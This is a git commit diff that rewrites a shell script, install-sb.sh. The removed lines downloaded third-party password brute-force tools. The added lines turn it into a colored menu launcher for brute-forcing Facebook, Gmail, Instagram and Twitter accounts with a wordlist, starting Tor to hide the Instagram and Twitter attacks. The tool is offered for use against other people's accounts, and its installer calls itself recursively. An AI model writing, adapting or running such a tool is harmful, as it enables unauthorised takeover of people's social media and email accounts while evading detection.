ac49dc3cfdb36c7a638209e79d72d13ed2c0ee16
anggacho <73550456+anggacho@users.noreply.github.com>
2021-03-04 00:30:47 +0700

    Update install-sb.sh

--- install-sb.sh
+++ install-sb.sh
@@ -1,31 +1,154 @@
 #!/bin/bash
-#Sysupdate
-sudo apt-get update 
-#Python
-sudo apt-get install python
-#gmail
-git clone https://github.com/Ha3MrX/Gemail-Hack.git
-#facebook
-if [ -d facebook ]; then
-        echo "Directory facebook exists.[✔]"
-else
-	mkdir facebook
-	cd facebook
-	wget raw.githubusercontent.com/Sup3r-Us3r/scripts/master/fb-brute.pl
-	cd ..
+#Colors
+white="\033[1;37m"
+grey="\033[0;37m"
+purple="\033[0;35m"
+red="\033[1;31m"
+green="\033[1;32m"
+yellow="\033[1;33m"
+Purple="\033[0;35m"
+Cyan="\033[0;36m"
+Cafe="\033[0;33m"
+Fiuscha="\033[0;35m"
+blue="\033[1;34m"
+nc="\e[0m"
+#ROOT PRIVILEGIES
+if [[ $EUID -ne 0 ]]; then
+        echo -e "$red You don't have Root privilegies, execute the script as root.$nc"
+        exit 1
 fi
-#Instagram
-git clone https://github.com/thelinuxchoice/instainsane.git
-cd instainsane
-chmod +x instainsane.sh
-chmod +x install.sh
-sudo ./install.sh
-cd ..
-#Twitter
-git clone https://github.com/thelinuxchoice/tweetshell.git
-cd tweetshell
-chmod +x tweetshell.sh
-chmod +x install.sh
-sudo ./install.sh
-cd ..
-
+#Installation
+sleep 1
+echo -e "Checking Installation $nc"
+bash install-sb.sh
+echo -e "Sudah siap geng [$green✓$nc] $nc "
+sleep 1
+clear
+#Startup
+echo -e "$green"
+echo "		.▄▄ ·        ▄▄· ▪   ▄▄▄· ▄▄▌      ▄▄▄▄·       ▐▄• ▄ "
+echo "		▐█ ▀. ▪     ▐█ ▌▪██ ▐█ ▀█ ██•      ▐█ ▀█▪▪      █▌█▌▪"
+echo "		▄▀▀▀█▄ ▄█▀▄ ██ ▄▄▐█·▄█▀▀█ ██▪      ▐█▀▀█▄ ▄█▀▄  ·██· "
+echo "		▐█▄▪▐█▐█▌.▐▌▐███▌▐█▌▐█ ▪▐▌▐█▌▐▌    ██▄▪▐█▐█▌.▐▌▪▐█·█▌"
+echo -e "		 ▀▀▀▀  ▀█▄▀▪·▀▀▀ ▀▀▀ ▀  ▀ .▀▀▀     ·▀▀▀▀  ▀█▄▀▪•▀▀ ▀▀$nc $blue v1$nc"
+echo -e "	[+]              $red Coded By CHOADDICT$nc         		   [+]"
+echo -e "	[+] 		 $red www.facebook.com/anggacho99$nc 		   [+]"
+echo -e "	[+] 		 $red  Pentesters$nc          		   [+]"
+echo -e "	[+]$red Special Greetz To$nc :$green {CHOADDICT , Ha3MrX, Tunisian Eagles}$nc [+]"
+echo ""
+echo -e "$yellow Select From Menu : $nc"
+echo ""
+echo -e "		$Cyan 1 : \CHO Brute Force Akun Facebook$nc"
+echo -e "		$Cyan 2 : \CHO Brute Force Akun Gmail$nc"
+echo -e "		$Cyan 3 : \CHO Brute Force Akun Instagram$nc"
+echo -e "		$Cyan 4 : \CHO Brute Force Akun Twitter$nc"
+echo -e "		$Cyan 99: Keluar$nc"
+read -p "Choice >  " ch
+if [ $ch = 1 ]; then
+echo -e "			$Cyan Facebook Brute Force$nc"
+echo -e "$green"
+read -p "Enter Facebook ID / Email / Username / Number: " id
+read -p "Enter wordlist path : " wordlist
+echo -e "$nc"
+cd facebook
+perl fb-brute.pl $id $wordlist
+echo -e " 		[+]$yellow Brute Force Complete $nc[$green✓$nc] $nc[+]"
+echo -e "$red"
+read -p "Wanna Back To Main Menu [ Y / n ] : " check
+echo -e "$nc"
+if [ $check = "Y" ]; then
+cd .. && bash SocialBox.sh
+elif [ $check = "y" ]; then
+cd .. && bash SocialBox.sh
+elif [ $check = "Yes" ]; then
+cd .. && bash SocialBox.sh
+elif [ $check = "yes" ]; then
+cd .. && bash SocialBox.sh
+elif [ $check = "YES" ]; then
+cd .. && bash SocialBox.sh
+else
+exit 1
+fi
+elif [ $ch = 2 ]; then
+echo -e "			$Cyan Gmail Brute Force$nc"
+cd Gemail-Hack
+python gemailhack.py
+echo -e "               [+]$yellow Brute Force Complete $nc[$green✓$nc] $nc[+]"
+echo -e "$red"
+read -p "Wanna Back To Main Menu [ Y / n ] : " check2
+echo -e "$nc"
+if [ $check2 = "Y" ]; then
+cd .. && bash SocialBox.sh
+elif [ $check2 = "y" ]; then
+cd .. && bash SocialBox.sh
+elif [ $check2 = "Yes" ]; then
+cd .. && bash SocialBox.sh
+elif [ $check2 = "yes" ]; then
+cd .. && bash SocialBox.sh
+elif [ $check2 = "YES" ]; then
+cd .. && bash SocialBox.sh
+else
+exit 1
+fi
+elif [ $ch = 3 ]; then
+echo -e "			$Cyan Instagram Brute Force$nc"
+cd instainsane/
+sleep 0.025
+	echo -e "	[+]$red Service Tor Stated $nc[+]"
+sleep 0.9
+service tor start
+./instainsane.sh
+echo -e "               [+]$yellow Brute Force Complete $nc[$green✓$nc] $nc[+]"
+service tor stop
+echo -e "		[+]$red Service Tor Stopped$nc [+]"
+echo -e "$red"
+read -p "Wanna Back To Main Menu [ Y / n ] : " check3
+echo -e "$nc"
+if [ $check3 = "Y" ]; then
+cd .. && bash SocialBox.sh
+elif [ $check3 = "y" ]; then
+cd .. && bash SocialBox.sh
+elif [ $check3 = "Yes" ]; then
+cd .. && bash SocialBox.sh
+elif [ $check3 = "yes" ]; then
+cd .. && bash SocialBox.sh
+elif [ $check3 = "YES" ]; then
+cd .. && bash SocialBox.sh
+else
+exit 1
+fi
+elif [ $ch = 4 ]; then
+echo -e "			$Cyan Twitter Brute Force$nc"
+cd tweetshell/
+sleep 0.025
+        echo -e "	[+]$red Service Tor Stated $nc[+]"
+sleep 0.9
+service tor start
+bash tweetshell.sh
+echo -e "               [+]$yellow Brute Force Complete $nc[$green✓$nc] $nc[+]"
+service tor stop
+echo -e "		[+]$red Service Tor Stopped$nc [+]"
+echo -e "$red"
+read -p "Wanna Back To Main Menu [ Y / n ] : " check4
+echo -e "$nc"
+if [ $check4 = "Y" ]; then
+cd .. && bash SocialBox.sh
+elif [ $check4 = "y" ]; then
+cd .. && bash SocialBox.sh
+elif [ $check4 = "Yes" ]; then
+cd .. && bash SocialBox.sh
+elif [ $check4 = "yes" ]; then
+cd .. && bash SocialBox.sh
+elif [ $check4 = "YES" ]; then
+cd .. && bash SocialBox.sh
+else
+exit 1
+fi
+elif [ $ch == 99 ]; then
+echo -e "$red Program Exit ...$nc"
+sleep 0.25
+exit 1
+else
+echo "Not Found 404 , Exit"
+exit 1
+fi
